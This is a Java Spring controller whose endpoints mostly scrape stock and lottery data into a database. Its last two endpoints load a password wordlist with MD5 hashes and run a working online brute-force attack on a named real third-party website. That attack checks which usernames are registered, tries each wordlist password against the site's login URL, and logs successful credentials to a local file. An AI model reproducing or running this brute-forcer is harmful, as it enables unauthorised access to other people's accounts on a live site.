package life.controller;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.text.ParseException;
import java.util.Date;
import java.util.List;

import life.dao.daletou.DaLeTouDao;
import life.entity.ResultEntity;
import life.entity.SecretEntity;
import life.entity.daletou.DaLeTouEntity;
import life.entity.dataget.SecuAnalyEntity;
import life.service.IndustryService;
import life.util.DLTDataGet;
import life.util.DataGet;
import life.util.MD5;
import net.sf.json.JSONArray;

import org.activiti.engine.impl.util.json.JSONObject;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

/**
 * @Title: ClaimController.java
 * @package life.controller
 * @Description: 抓取数据
 * @author xusheng.liu
 * @date 2015年11月16日 下午3:08:15
 * @version V1.0
 */
@Controller
@RequestMapping("/secu")
public class IndustryController {

	@Autowired
	private IndustryService analyService;
	private Logger logger = LogManager.getLogger(getClass());
	@Autowired
	private DaLeTouDao daLeTouDao;
	/**
	 * @Descript:此模块主页面
	 * @author xusheng.liu
	 * @return
	 */
	@RequestMapping("/l")
	public String list() {
		return "secu/secu";
	}

	/**
	 * @Descript:抓取数据
	 * @author xusheng.liu
	 */
	@SuppressWarnings("unchecked")
	@ResponseBody
	@RequestMapping("/g/d")
	public ResultEntity getData(@RequestParam("pageNo") String pageNo,
			@RequestParam("pageSize") String pageSize) throws Exception {
		logger.info("-->getData方法开始执行，参数：pageNo="+pageNo+";pageSIze="+pageSize);
		String html = DataGet.getOneHtml(DataGet.getDataUrl(Integer.parseInt(pageNo), Integer.parseInt(pageSize)), "uft-8");
		JSONObject jb = new JSONObject(html.substring(html.indexOf("=") + 1,
				html.length()));
		List<String> l = JSONArray.fromObject(jb.get("data").toString());
		int count = 0;
		if (l != null && l.size() > 0) {
			SecuAnalyEntity entity = null;
			for (String i : l) {
				entity = packageEntity(i);
				if (entity != null) {
					List<SecuAnalyEntity> secuAnaly = this.analyService
							.querySecuAnalyByCodeAndTime(entity);
					if (secuAnaly != null && secuAnaly.size() > 0) {
						logger.info("-->已经存在...");
					} else {
						this.analyService.insert(entity);
						count++;
						logger.info("-->保存成功：" + entity);
					}
				}
			}
		}
		return new ResultEntity(true, count+"");
	}
	
	@ResponseBody
	@RequestMapping("/glt")
	public ResultEntity save(@RequestParam("pageNo") String pageNo) throws Exception {
		logger.info("-->save方法开始执行，参数：pageNo="+pageNo);
		for (int i = 16001; i < 16123; i++) {
			pageNo = i+"";
			DaLeTouEntity touEntity = DLTDataGet.saveDaLeTou(pageNo);
			if(touEntity!=null)
				try{
					daLeTouDao.insert(touEntity);
				}catch (Exception e) {
					logger.info("-->已经保存");
				}
		}
		return null;
	}
	
	@SuppressWarnings("unchecked")
	@ResponseBody
	@RequestMapping("/g/d/f")
	public ResultEntity getFianlData(@RequestParam("pageNo") String pageNo,
			@RequestParam("pageSize") String pageSize) throws Exception {
		logger.info("-->getFianlData方法开始执行，参数：pageNo="+pageNo+";pageSIze="+pageSize);
		String html = DataGet.getOneHtml(DataGet.getFianlUrl(Integer.parseInt(pageNo), Integer.parseInt(pageSize)), "uft-8");
		JSONObject jb = new JSONObject(html.substring(html.indexOf("=") + 1,
				html.length()));
		List<String> l = JSONArray.fromObject(jb.get("data").toString());
		int count = 0;
		this.analyService.insertFianl(l,count);
		return new ResultEntity(true, count+"");
	}

	/**
	 * @Descript:封装数据
	 * @author xusheng.liu
	 */
	private SecuAnalyEntity packageEntity(String string) throws ParseException {
		SecuAnalyEntity entity;
		String[] split = string.split(",");
		entity = new SecuAnalyEntity();
		entity.setCode(Integer.parseInt(split[1]));
		entity.setName(split[2]);
		entity.setLastPrice(split[3]);
		if(!"-".equals(split[4]))
			entity.setTodayUpOrDown(Double.parseDouble(split[4]));
		entity.setTime(split[15].split(" ")[0]);
		return entity;
	}
	
	@ResponseBody
	@RequestMapping("/g/c")
	public ResultEntity getCounts(@RequestParam("datetype") Integer dateType ) throws Exception {
		logger.info("-->getCounts方法开始执行，参数：dateType="+dateType );
		this.analyService.findCountByDateType(dateType);
		int count = 0;
		return new ResultEntity(true, count+"");
	}
	
	/**
	 * 保存密码到数据库
	 * @return
	 * @throws Exception
	 */
	@RequestMapping("/ccc")
	public ResultEntity ceshi() throws Exception {
		File file = new File("D:\\1111111111\\1pass03.txt");
		BufferedReader reader = null;
        try {
        	Integer i= 0;
            reader = new BufferedReader(new FileReader(file));
            String tempString = null;
            long now = new Date().getTime();
            synchronized (i) {
            	while ((tempString = reader.readLine()) != null) {
                	i++;
                    SecretEntity se = new SecretEntity();
                    se.setContent(tempString);
                    se.setCount(tempString.length());
                    se.setMd5Content(MD5.getMD5String(tempString));
                    try{
                    	analyService.duwenjian(se);
                    	logger.info("--->>>成功--第："+i);
                    }catch(Exception e){
                    	logger.info("--->>>失败--第："+i);
                    }
                }
                logger.info("-->>>执行完毕："+i+"----执行时间："+(new Date().getTime()-now));
			} 
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
            	try {
					reader.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
            }
        }
		return null;
	}
	
	/**
	 * 暴力破解密码接口
	 */
	static String ChekcSuc = "通过";
	static String username = "yly123,lll,test,wuqing,123456";// 2~40
	@RequestMapping("/c")
	public void ceshai() throws Exception {
		logger.info("-->kashi");
		Date d = new Date();
		Integer i = 0;
		List<SecretEntity> list = analyService.query(new SecretEntity());
		logger.info("--->查询时间是：" + (new Date().getTime()-d.getTime()));
		synchronized (i) {
			if(list!=null && list.size()>0){
				String[] strings = username.split(",");
				for (String string : strings) {
					String checkName = "http://www.mba518.com/users/checkreg.asp?username="
							+ string;
					Document check = Jsoup.connect(checkName).get();
					String html = check.getElementById("jump").parent().parent().parent()
							.child(0).text();
					if (html.contains(ChekcSuc)) {
						logger.info("-->不可用");
					} else {
						logger.info("-->已经注册，开始模拟测试密码");
						for (SecretEntity secretEntity : list) {
							String password = secretEntity.getContent();
							String s = "http://www.mba518.com/users/login.asp?action=login&password="
									+ password + "&username=" + string;
							// String content = getOneHtml(s, "gb2312");
							Element element = null;
							try {
								Document doc = Jsoup.connect(s).get();
								element = doc.getElementById("qqkf");
							} catch (Exception e1) {
								e1.printStackTrace();
							}
							if (element != null) {
								logger.info("-->通过！");
								File file = new File("D:\\1111111111\\shell.txt");
								String content = string+"---->"+password;
								try (FileOutputStream fop = new FileOutputStream(file,true)) {
									if (!file.exists()) {
										file.createNewFile();
									}
									BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(fop));
									bw.write(content+ "\r\n");
	//								bw.newLine();
									bw.flush();
									fop.close();
									bw.close();
								} catch (IOException e) {
									e.printStackTrace();
								}
								break;
							} else {
								logger.info("-->密码错误，继续测试:"+i++);
							}
						}
					}
				}
			}
		}
	}
	
}
